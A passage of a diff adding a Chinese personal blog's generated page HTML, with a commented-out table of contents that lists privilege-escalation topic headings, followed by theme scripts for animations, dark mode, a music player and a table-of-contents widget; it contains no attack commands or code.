toc-level-1"><a class="toc-link" href="#root%E6%8F%90%E6%9D%83-%E2%80%93windows-linux"><span class="toc-text">root提权 –windows&#x2F;linux</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#serv-u%E6%8F%90%E6%9D%83-%E2%80%93ftp%E2%80%93windows"><span class="toc-text">serv-u提权 –ftp–windows</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-text">**端口转发 **</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#nc%E5%8F%8D%E5%BC%B9%E6%8F%90%E6%9D%83"><span class="toc-text">**nc反弹提权 **</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%98%9F%E5%A4%96%E6%8F%90%E6%9D%83-%E2%80%93windows"><span class="toc-text">星外提权 –windows</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#360%E6%8F%90%E6%9D%83-%E2%80%93windows"><span class="toc-text">360提权 –windows</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%90%9C%E7%8B%97%E6%8F%90%E6%9D%83-%E2%80%93windows"><span class="toc-text">搜狗提权 –windows</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%8E%E4%BC%97%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83-%E2%80%93windows"><span class="toc-text">华众虚拟主机提权 –windows</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#N%E7%82%B9%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA-%E2%80%93windows"><span class="toc-text">N点虚拟主机 –windows</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF"><span class="toc-text">提权思路</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF"><span class="toc-text">Windows系统漏洞提权思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#linux%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF"><span class="toc-text">linux系统提权思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF"><span class="toc-text">数据库提权思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E2%80%94%E2%80%94udf%E6%8F%90%E6%9D%83"><span class="toc-text">(1)mysql数据库——udf提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83%E2%80%94%E2%80%94mof%E6%8F%90%E6%9D%83"><span class="toc-text">(2)#数据库提权——mof提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83%E2%80%94%E2%80%94%E5%8F%8D%E5%BC%B9%E7%AB%AF%E5%8F%A3%E6%8F%90%E6%9D%83"><span class="toc-text">(3)#数据库提权——反弹端口提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8xp-cmdshell%E6%8F%90%E6%9D%83"><span class="toc-text">利用xp_cmdshell提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF"><span class="toc-text">第三方软件提权思路</span></a></li></ol></li></ol></li></ol> -->
+        <div class="toc"></div>
+      </div>
+    </div>
+  </div>
+</section>
+<!-- 手机端目录按钮 -->
+<div id="toc-mobile-btn">
+  <i class="fas fa-list-ul" aria-hidden="true"></i>
+</div>
+
+      
+  <section class="widget side_recent_post">
+    
+  <header>
+    
+      <a style="color: " href='/tags/'><i class="fas fa-book fa-fw" aria-hidden="true"></i><span class='name'>最新文章</span></a>
+    
+  </header>
+
+
+    <div class='content'>
+      
+      <!-- hash算法 -->
+      
+      <div class="aside-list">
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2024/03/15/masscan%E4%BD%BF%E7%94%A8%E5%8F%82%E6%95%B0%E8%AE%B0%E5%BD%95/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://pic1.zhimg.com/80/v2-03a22891ccba9bccf6424dfd7cbf4be7_1440w.webp" class="lazyload placeholder" data-srcset="https://pic1.zhimg.com/80/v2-03a22891ccba9bccf6424dfd7cbf4be7_1440w.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">03-15</span>
+                
+              </div>
+              <a class="post-title" href="/2024/03/15/masscan%E4%BD%BF%E7%94%A8%E5%8F%82%E6%95%B0%E8%AE%B0%E5%BD%95/">no title</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2024/03/15/docker%E9%83%A8%E7%BD%B2/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://pic1.zhimg.com/80/v2-03a22891ccba9bccf6424dfd7cbf4be7_1440w.webp" class="lazyload placeholder" data-srcset="https://pic1.zhimg.com/80/v2-03a22891ccba9bccf6424dfd7cbf4be7_1440w.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">03-15</span>
+                
+              </div>
+              <a class="post-title" href="/2024/03/15/docker%E9%83%A8%E7%BD%B2/">no title</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2024/03/15/nslookup%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://pic1.zhimg.com/80/v2-03a22891ccba9bccf6424dfd7cbf4be7_1440w.webp" class="lazyload placeholder" data-srcset="https://pic1.zhimg.com/80/v2-03a22891ccba9bccf6424dfd7cbf4be7_1440w.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">03-15</span>
+                
+              </div>
+              <a class="post-title" href="/2024/03/15/nslookup%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">no title</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2024/03/15/shadow/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://pic1.zhimg.com/80/v2-03a22891ccba9bccf6424dfd7cbf4be7_1440w.webp" class="lazyload placeholder" data-srcset="https://pic1.zhimg.com/80/v2-03a22891ccba9bccf6424dfd7cbf4be7_1440w.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">03-15</span>
+                
+              </div>
+              <a class="post-title" href="/2024/03/15/shadow/">no title</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2024/02/26/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://pic1.zhimg.com/80/v2-03a22891ccba9bccf6424dfd7cbf4be7_1440w.webp" class="lazyload placeholder" data-srcset="https://pic1.zhimg.com/80/v2-03a22891ccba9bccf6424dfd7cbf4be7_1440w.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">02-26</span>
+                
+              </div>
+              <a class="post-title" href="/2024/02/26/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">no title</a>
+            </div>
+          </div>
+        
+      </div>
+    </div>
+  </section>
+
+    
+  </div>
+</aside>
+
+  <!-- 图片放大 Wrap images with fancybox support -->
+  <script defer src="/js/wrapImage.js"></script>
+</div>
+
+<!-- 文章详情页背景图 -->
+<div id="appBgSwiper" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -2;"
+	:style="{'background-color': bgColor ? bgColor : 'transparent'}">
+	<transition-group tag="ul" :name="names">
+		<li v-for='(image,index) in img' :key='index' v-show="index === mark" class="bg-swiper-box">
+			<img :src="image" class="bg-swiper-img no-lazy">
+		</li>
+	</transition-group>
+</div>
+<script>
+	var vm = new Vue({
+		el: '#appBgSwiper',
+		data: {
+			names: '' || 'fade' || 'fade', // translate-fade fade
+			mark: 0,
+			img: [],
+			bgColor: '',
+			time: null
+		},
+		methods: {   //添加方法
+			change(i, m) {
+				if (i > m) {
+					// this.names = 'fade';
+				} else if (i < m) {
+					// this.names = 'fade';
+				} else {
+					return;
+				}
+				this.mark = i;
+			},
+			prev() {
+				// this.names = 'fade';
+				this.mark--;
+				if (this.mark === -1) {
+					this.mark = 3;
+					return
+				}
+			},
+			next() {
+				// this.names = 'fade';
+				this.mark++;
+				if (this.mark === this.img.length) {
+					this.mark = 0;
+					return
+				}
+			},
+			autoPlay() {
+				// this.names = 'fade';
+				this.mark++;
+				if (this.mark === this.img.length) {
+					this.mark = 0;
+					return
+				}
+			},
+			play() {
+				let bgImgDelay = '' || '180000'
+				let delay = parseInt(bgImgDelay) || 180000;
+				this.time = setInterval(this.autoPlay, delay);
+			},
+			enter() {
+				clearInterval(this.time);
+			},
+			leave() {
+				this.play();
+			}
+		},
+		created() {
+			this.play()
+		},
+		beforeDestroy() {
+			clearInterval(this.time);
+		},
+		mounted() {
+			let prop = '' || '';
+			let isImg = prop.includes('.bmp') || prop.includes('.jpg') || prop.includes('.png') || prop.includes('.tif') || prop.includes('.gif') || prop.includes('.pcx') || prop.includes('.tga') || prop.includes('.exif') || prop.includes('.fpx') || prop.includes('.psd') || prop.includes('.cdr') || prop.includes('.pcd') || prop.includes('.dxf') || prop.includes('.ufo') || prop.includes('.eps') || prop.includes('.ai') || prop.includes('.raw') || prop.includes('.WMF') || prop.includes('.webp') || prop.includes('.jpeg') || prop.includes('http://') || prop.includes('https://')
+			if (isImg) {
+				let img = prop.split(',');
+				let configRoot = '/'
+				let arrImg = [];
+				img.forEach(el => {
+					var Expression = /http(s)?:\/\/([\w-]+\.)+[\w-]+(\/[\w- .\/?%&=]*)?/;
+					var objExp = new RegExp(Expression);
+
+					if (objExp.test(el)) {
+						// http or https
+						arrImg.push(el);
+					} else {
+						// 非http or https开头
+						// 本地文件
+						let firstStr = el.charAt(0);
+						if (firstStr == '/') {
+							el = el.substr(1); // 删除第一个字符 '/',因为 configRoot最后一个字符为 /
+						}
+						el = configRoot + el;
+						arrImg.push(el);
+					}
+				})
+				this.img = arrImg;
+			} else {
+				this.bgColor = prop;
+			}
+		}
+	})
+</script>
+
+<style>
+	.bg-swiper-box {
+		position: absolute;
+		display: block;
+		width: 100%;
+		height: 100%;
+	}
+
+	.bg-swiper-img {
+		object-fit: cover;
+		width: 100%;
+		height: 100%;
+	}
+</style>
+
+
+
+
+  <script>
+  function loadMermaid() {
+    if (document.getElementsByClassName('mermaid').length) {
+      if (window.mermaidJsLoad) mermaid.init()
+      else {
+        loadScript('https://unpkg.com/mermaid/dist/mermaid.min.js').then(() => {
+          window.mermaidJsLoad = true
+          mermaid.initialize({
+            theme: 'default',
+          })
+          if ('true') {
+            mermaid.init();
+          }
+        })
+      }
+    }
+  };
+  document.addEventListener("DOMContentLoaded", function () {
+    loadMermaid();
+  })
+
+  document.addEventListener('pjax:complete', function () {
+    loadMermaid();
+  })
+  
+</script>
+
+
+      </main>
+    </div>
+
+    <!-- 页脚 -->
+    
+  
+  
+    <!-- 底部鱼儿跳动效果，依赖于jquery-->
+<div id="j-fish-skip" style=" position: relative;height: 153px;width: auto;"></div>
+<script defer>
+  var RENDERER = {
+    POINT_INTERVAL: 5,
+    FISH_COUNT: 3,
+    MAX_INTERVAL_COUNT: 50,
+    INIT_HEIGHT_RATE: .5,
+    THRESHOLD: 50,
+    FISH_COLOR: '',
+    init: function () {
+      this.setFishColor(); this.setParameters(), this.reconstructMethods(), this.setup(), this.bindEvent(), this.render()
+    },
+    setFishColor: function () {
+      let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('false');
+      if (isDark) {
+        this.FISH_COLOR = '#222'; // 暗黑色，有时间把这整成一个变量
+      } else {
+        this.FISH_COLOR = '' || 'rgba(66, 185, 133, 0.8)';
+      }
+    },
+    setParameters: function () {
+      this.$window = $(window), this.$container = $("#j-fish-skip"), this.$canvas = $("<canvas />"), this.context = this.$canvas.appendTo(this.$container).get(0).getContext("2d"), this.points = [], this.fishes = [], this.watchIds = []
+    },
+    createSurfacePoints: function () {
+      var t = Math.round(this.width / this.POINT_INTERVAL);
+      this.pointInterval = this.width / (t - 1), this.points.push(new SURFACE_POINT(this, 0));
+      for (var i = 1; i < t; i++) {
+        var e = new SURFACE_POINT(this, i * this.pointInterval),
+          h = this.points[i - 1];
+        e.setPreviousPoint(h), h.setNextPoint(e), this.points.push(e)
+      }
+    },
+    reconstructMethods: function () {
+      this.watchWindowSize = this.watchWindowSize.bind(this), this.jdugeToStopResize = this.jdugeToStopResize.bind(this), this.startEpicenter = this.startEpicenter.bind(this), this.moveEpicenter = this.moveEpicenter.bind(this), this.reverseVertical = this.reverseVertical.bind(this), this.render = this.render.bind(this)
+    },
+    setup: function () {
+      this.points.length = 0, this.fishes.length = 0, this.watchIds.length = 0, this.intervalCount = this.MAX_INTERVAL_COUNT, this.width = this.$container.width(), this.height = this.$container.height(), this.fishCount = this.FISH_COUNT * this.width / 500 * this.height / 500, this.$canvas.attr({
+        width: this.width,
+        height: this.height
+      }), this.reverse = !1, this.fishes.push(new FISH(this)), this.createSurfacePoints()
+    },
+    watchWindowSize: function () {
+      this.clearTimer(), this.tmpWidth = this.$window.width(), this.tmpHeight = this.$window.height(), this.watchIds.push(setTimeout(this.jdugeToStopResize, this.WATCH_INTERVAL))
+    },
+    clearTimer: function () {
+      for (; this.watchIds.length > 0;) clearTimeout(this.watchIds.pop())
+    },
+    jdugeToStopResize: function () {
+      var t = this.$window.width(),
+        i = this.$window.height(),
+        e = t == this.tmpWidth && i == this.tmpHeight;
+      this.tmpWidth = t, this.tmpHeight = i, e && this.setup()
+    },
+    bindEvent: function () {
+      this.$window.on("resize", this.watchWindowSize), this.$container.on("mouseenter", this.startEpicenter), this.$container.on("mousemove", this.moveEpicenter)
+    },
+    getAxis: function (t) {
+      var i = this.$container.offset();
+      return {
+        x: t.clientX - i.left + this.$window.scrollLeft(),
+        y: t.clientY - i.top + this.$window.scrollTop()
+      }
+    },
+    startEpicenter: function (t) {
+      this.axis = this.getAxis(t)
+    },
+    moveEpicenter: function (t) {
+      var i = this.getAxis(t);
+      this.axis || (this.axis = i), this.generateEpicenter(i.x, i.y, i.y - this.axis.y), this.axis = i
+    },
+    generateEpicenter: function (t, i, e) {
+      if (!(i < this.height / 2 - this.THRESHOLD || i > this.height / 2 + this.THRESHOLD)) {
+        var h = Math.round(t / this.pointInterval);
+        h < 0 || h >= this.points.length || this.points[h].interfere(i, e)
+      }
+    },
+    reverseVertical: function () {
+      this.reverse = !this.reverse;
+      for (var t = 0, i = this.fishes.length; t < i; t++) this.fishes[t].reverseVertical()
+    },
+    controlStatus: function () {
+      for (var t = 0, i = this.points.length; t < i; t++) this.points[t].updateSelf();
+      for (t = 0, i = this.points.length; t < i; t++) this.points[t].updateNeighbors();
+      this.fishes.length < this.fishCount && 0 == --this.intervalCount && (this.intervalCount = this.MAX_INTERVAL_COUNT, this.fishes.push(new FISH(this)))
+    },
+    render: function () {
+      requestAnimationFrame(this.render), this.controlStatus(), this.context.clearRect(0, 0, this.width, this.height), this.context.fillStyle = this.FISH_COLOR;
+      for (var t = 0, i = this.fishes.length; t < i; t++) this.fishes[t].render(this.context);
+      this.context.save(), this.context.globalCompositeOperation = "xor", this.context.beginPath(), this.context.moveTo(0, this.reverse ? 0 : this.height);
+      for (t = 0, i = this.points.length; t < i; t++) this.points[t].render(this.context);
+      this.context.lineTo(this.width, this.reverse ? 0 : this.height), this.context.closePath(), this.context.fill(), this.context.restore()
+    }
+  },
+  SURFACE_POINT = function (t, i) {
+    this.renderer = t, this.x = i, this.init()
+  };
+  SURFACE_POINT.prototype = {
+    SPRING_CONSTANT: .03,
+    SPRING_FRICTION: .9,
+    WAVE_SPREAD: .3,
+    ACCELARATION_RATE: .01,
+    init: function () {
+      this.initHeight = this.renderer.height * this.renderer.INIT_HEIGHT_RATE, this.height = this.initHeight, this.fy = 0, this.force = {
+        previous: 0,
+        next: 0
+      }
+    },
+    setPreviousPoint: function (t) {
+      this.previous = t
+    },
+    setNextPoint: function (t) {
+      this.next = t
+    },
+    interfere: function (t, i) {
+      this.fy = this.renderer.height * this.ACCELARATION_RATE * (this.renderer.height - this.height - t >= 0 ? -1 : 1) * Math.abs(i)
+    },
+    updateSelf: function () {
+      this.fy += this.SPRING_CONSTANT * (this.initHeight - this.height), this.fy *= this.SPRING_FRICTION, this.height += this.fy
+    },
+    updateNeighbors: function () {
+      this.previous && (this.force.previous = this.WAVE_SPREAD * (this.height - this.previous.height)), this.next && (this.force.next = this.WAVE_SPREAD * (this.height - this.next.height))
+    },
+    render: function (t) {
+      this.previous && (this.previous.height += this.force.previous, this.previous.fy += this.force.previous), this.next && (this.next.height += this.force.next, this.next.fy += this.force.next), t.lineTo(this.x, this.renderer.height - this.height)
+    }
+  };
+  var FISH = function (t) {
+    this.renderer = t, this.init()
+  };
+  FISH.prototype = {
+    GRAVITY: .4,
+    init: function () {
+      this.direction = Math.random() < .5, this.x = this.direction ? this.renderer.width + this.renderer.THRESHOLD : -this.renderer.THRESHOLD, this.previousY = this.y, this.vx = this.getRandomValue(4, 10) * (this.direction ? -1 : 1), this.renderer.reverse ? (this.y = this.getRandomValue(1 * this.renderer.height / 10, 4 * this.renderer.height / 10), this.vy = this.getRandomValue(2, 5), this.ay = this.getRandomValue(.05, .2)) : (this.y = this.getRandomValue(6 * this.renderer.height / 10, 9 * this.renderer.height / 10), this.vy = this.getRandomValue(-5, -2), this.ay = this.getRandomValue(-.2, -.05)), this.isOut = !1, this.theta = 0, this.phi = 0
+    },
+    getRandomValue: function (t, i) {
+      return t + (i - t) * Math.random()
+    },
+    reverseVertical: function () {
+      this.isOut = !this.isOut, this.ay *= -1
+    },
+    controlStatus: function (t) {
+      this.previousY = this.y, this.x += this.vx, this.y += this.vy, this.vy += this.ay, this.renderer.reverse ? this.y > this.renderer.height * this.renderer.INIT_HEIGHT_RATE ? (this.vy -= this.GRAVITY, this.isOut = !0) : (this.isOut && (this.ay = this.getRandomValue(.05, .2)), this.isOut = !1) : this.y < this.renderer.height * this.renderer.INIT_HEIGHT_RATE ? (this.vy += this.GRAVITY, this.isOut = !0) : (this.isOut && (this.ay = this.getRandomValue(-.2, -.05)), this.isOut = !1), this.isOut || (this.theta += Math.PI / 20, this.theta %= 2 * Math.PI, this.phi += Math.PI / 30, this.phi %= 2 * Math.PI), this.renderer.generateEpicenter(this.x + (this.direction ? -1 : 1) * this.renderer.THRESHOLD, this.y, this.y - this.previousY), (this.vx > 0 && this.x > this.renderer.width + this.renderer.THRESHOLD || this.vx < 0 && this.x < -this.renderer.THRESHOLD) && this.init()
+    },
+    render: function (t) {
+      t.save(), t.translate(this.x, this.y), t.rotate(Math.PI + Math.atan2(this.vy, this.vx)), t.scale(1, this.direction ? 1 : -1), t.beginPath(), t.moveTo(-30, 0), t.bezierCurveTo(-20, 15, 15, 10, 40, 0), t.bezierCurveTo(15, -10, -20, -15, -30, 0), t.fill(), t.save(), t.translate(40, 0), t.scale(.9 + .2 * Math.sin(this.theta), 1), t.beginPath(), t.moveTo(0, 0), t.quadraticCurveTo(5, 10, 20, 8), t.quadraticCurveTo(12, 5, 10, 0), t.quadraticCurveTo(12, -5, 20, -8), t.quadraticCurveTo(5, -10, 0, 0), t.fill(), t.restore(), t.save(), t.translate(-3, 0), t.rotate((Math.PI / 3 + Math.PI / 10 * Math.sin(this.phi)) * (this.renderer.reverse ? -1 : 1)), t.beginPath(), this.renderer.reverse ? (t.moveTo(5, 0), t.bezierCurveTo(10, 10, 10, 30, 0, 40), t.bezierCurveTo(-12, 25, -8, 10, 0, 0)) : (t.moveTo(-5, 0), t.bezierCurveTo(-10, -10, -10, -30, 0, -40), t.bezierCurveTo(12, -25, 8, -10, 0, 0)), t.closePath(), t.fill(), t.restore(), t.restore(), this.controlStatus(t)
+    }
+  }, $(function () {
+    RENDERER.init()
+    $('.dark').click(function () {
+      setTimeout(() => {
+        RENDERER.setFishColor();
+        RENDERER.context.fill();
+      });
+    })
+  });
+</script>
+  
+  <div class="footer bg-color">
+    <div class="footer-main">
+      
+        
+          <div class="link">
+            
+          </div>
+        
+      
+        
+          <div class="footer-copyright">
+            <p>Copyright © 2022 - 2024 <a target="_blank" rel="noopener" href="https://github.com/16778738">16778738</a> | Powered by “&gt;</a> |  </p>
+
+          </div>
+        
+      
+        
+          <div class="footer-custom">
+            
+          </div>
+        
+      
+    </div>
+  </div>
+
+
+
+    <!-- 渲染暗黑按钮 -->
+    
+      <div class="dark" onclick="toggleDarkMode()">
+  <div class="dark-content">
+    <i class="fas" id="darkIcon" aria-hidden="true"></i>
+  </div>
+</div>
+
+<script defer>
+  $(function() {
+    // 初始化暗黑模式状态
+    let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('false');
+    updateDarkModeIcon(isDark);
+  });
+
+  function toggleDarkMode() {
+    const isDark = $(document.body).hasClass('darkModel');
+    $(document.body).toggleClass('darkModel');
+    localStorage.setItem('dark', !isDark);
+    updateDarkModeIcon(!isDark);
+  }
+
+  function updateDarkModeIcon(isDark) {
+    const iconElement = document.getElementById('darkIcon');
+    if (isDark) {
+      iconElement.classList.remove('fa-moon');
+      iconElement.classList.add('fa-lightbulb');
+    } else {
+      iconElement.classList.remove('fa-lightbulb');
+      iconElement.classList.add('fa-moon');
+    }
+  }
+</script>
+
+    
+    <!-- 渲染回到顶部按钮 -->
+    
+      <div class="goTop top-btn-color" pointer>
+  <i class="fas fa-arrow-up" aria-hidden="true"></i>
+</div>
+<script defer src="/js/goTop.js"></script>
+
+    
+    <!-- 渲染左下角音乐播放器 -->
+    
+      <link rel="stylesheet" href="/js/aplayer/APlayer@1.10.1.min.css">
+<style>
+.aplayer .aplayer-lrc p {
+  
+  font-size: 12px;
+  font-weight: 700;
+  line-height: 16px !important;
+}
+
+.aplayer .aplayer-lrc p.aplayer-lrc-current {
+  
+  font-size: 15px;
+  color: #42b983;
+}
+
+
+.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+  left: -66px !important;
+}
+
+.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+  left: 0px !important;
+}
+
+
+</style>
+<meting-js  
+  class=""
+  server="tencent"
+  type="playlist"
+  id="8062553743"
+  fixed='true'
+  autoplay='false'
+  theme='#42b983'
+  loop='all'
+  order='random'
+  preload='auto'
+  volume='0.7'
+  list-folded='true'
+>
+</meting-js>
+
+<!-- <style>
+  #aplayer {
+    position: fixed;
+    left: 0;
+    bottom: 300px;
+  }
+</style> -->
+<script defer src="https://unpkg.com/aplayer@1.10.1/dist/APlayer.min.js"></script>
+<script defer src="https://unpkg.com/meting@2/dist/Meting.min.js"></script>
+    
+
+    <!-- 图片放大 -->
+    
+      <script src="https://unpkg.com/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js"></script>
+    
+
+    <!-- 百度解析 -->
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script async>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <!-- 背景彩带 -->
+    
+      <script async type="text/javascript" size="100" alpha='0.4' zIndex="-1" src="/js/ribbon.min.js"></script>
+    
+
+    <script src="/js/utils/index.js"></script>
+    <script src="/js/app.js"></script>
+    
+    <!-- 文章目录所需js -->
+<!-- <link href="/js/tocbot/tocbot.css" rel="stylesheet">
+<script src="/js/tocbot/tocbot.min.js"></script> -->
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.18.2/tocbot.min.js"></script>
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.18.2/tocbot.css">
+
+<script>
+  var headerEl = 'h2, h3, h4',  //headers 
+    content = '.post-detail',//文章容器
+    idArr = {};  //标题数组以确定是否增加索引id
+  //add #id
+  var option = {
+    // Where to render the table of contents.
+    tocSelector: '.toc',
+    // Where to grab the headings to build the table of contents.
+    contentSelector: content,
+    // Which headings to grab inside of the contentSelector element.
+    headingSelector: headerEl,
+    scrollSmooth: true,
+    scrollSmoothOffset: -70,
+    // headingsOffset: -($(window).height() * 0.4 - 45),
+    headingsOffset: -($(window).height() * 0.4 - 70),
+    // positionFixedSelector: '.toc-main',
+    // positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto',
+    activeLinkClass: 'is-active-link',
+    orderedList: true,
+    collapseDepth: 20,
+    // onClick: function (e) {},
+  }
+  if ($('.toc').length > 0) {
+
+    $(content).children(headerEl).each(function () {
+      //去除空格以及多余标点
+      var headerId = $(this).text().replace(/[\s|\~|`|\!|\@|\#|\$|\%|\^|\&|\*|\(|\)|\_|\+|\=|\||\|\[|\]|\{|\}|\;|\:|\"|\'|\,|\<|\.|\>|\/|\?|\：|\，|\。]/g, '');
+
+      headerId = headerId.toLowerCase();
+      if (idArr[headerId]) {
+        //id已经存在
+        $(this).attr('id', headerId + '-' + idArr[headerId]);
+        idArr[headerId]++;
+      }
+      else {
+        //id未存在
+        idArr[headerId] = 1;
+        $(this).attr('id', headerId);
+      }
+    });
+
+    document.addEventListener("DOMContentLoaded", function () {
+      tocbot.init(option);
+      mobileTocClick();
+    });
+
+  }
+
+  window.tocScrollFn = function () {
+    return bamboo.throttle(function () {
+      findHeadPosition();
+    }, 100)()
+  }
+  window.addEventListener('scroll', tocScrollFn);
+
+  const findHeadPosition = function (top) {
+    if ($('.toc-list').length <= 0) {
+      return false;
+    }
+    setTimeout(() => {  // or DOMContentLoaded 
+      autoScrollToc();
+    }, 0);
+  }
+
+  const autoScrollToc = function () {
+    const $activeItem = document.querySelector('.is-active-link');
+    const $cardToc = document.querySelector('.toc-content');
+    const activePosition = $activeItem.getBoundingClientRect().top
+    const sidebarScrollTop = $cardToc.scrollTop
+    if (activePosition > (document.documentElement.clientHeight - 100)) {
+      $cardToc.scrollTop = sidebarScrollTop + 150
+    }
+    if (activePosition < 150) {
+      $cardToc.scrollTop = sidebarScrollTop - 150
+    }
+  }
+
+  document.addEventListener('pjax:send', function () {
+    if ($('.toc').length) {
+      tocbot.destroy();
+    }
+  });
+
+  document.addEventListener('pjax:complete', function () {
+    if ($('.toc').length) {
+      tocbot.init(option);
+      mobileTocClick();
+    }
+  });
+  
+  // 手机端toc按钮点击出现目录
+  const mobileTocClick = function () {
+    const $cardTocLayout = document.getElementsByClassName('side_toc')[0];
+    const $cardToc = $cardTocLayout.getElementsByClassName('toc-content')[0];
+    let right = '45px';
+    if (window.innerWidth >= 551 && window.innerWidth <= 992) {
+      right = '100px'
+    }
+    const mobileToc = {
+      open: () => {
+        $cardTocLayout.style.cssText = 'animation: toc-open .3s; opacity: 1; right: ' + right
+      },
+
+      close: () => {
+        $cardTocLayout.style.animation = 'toc-close .2s'
+        setTimeout(() => {
+          $cardTocLayout.style.cssText = "opacity:''; animation: ''; right: ''"
+        }, 100)
+      }
+    }
+    document.getElementById('toc-mobile-btn').addEventListener('click', () => {
+      if (window.getComputedStyle($cardTocLayout).getPropertyValue('opacity') === '0') mobileToc.open()
+      else mobileToc.close()
+    })
+
+    $cardToc.addEventListener('click', (e) => {
+      if (window.innerWidth < 992) { // 小于992px的时候
+        mobileToc.close()
+      }
+    })
+  }
+</script>
+
+<style>
+  /* .is-position-fixed {
+    position: sticky !important;
+    top: 74px;
+  }
+
+  .toc-main ul {
+    counter-reset: show-list;
+  }
+
+  .toc-main ul li::before {
+    content: counter(item)".";
+    display: block;
+    position: absolute;
+    left: 12px;
+    top: 0;
+  } */
+</style>
+ 
+
+<!-- 设置导航背景 -->
+<script>
+  let setHeaderClass = () => {
+    const nav = $('#navHeader');
+    const navTop = nav.outerHeight();
+    const winTop = $(window).scrollTop();
+    if(winTop > navTop) {
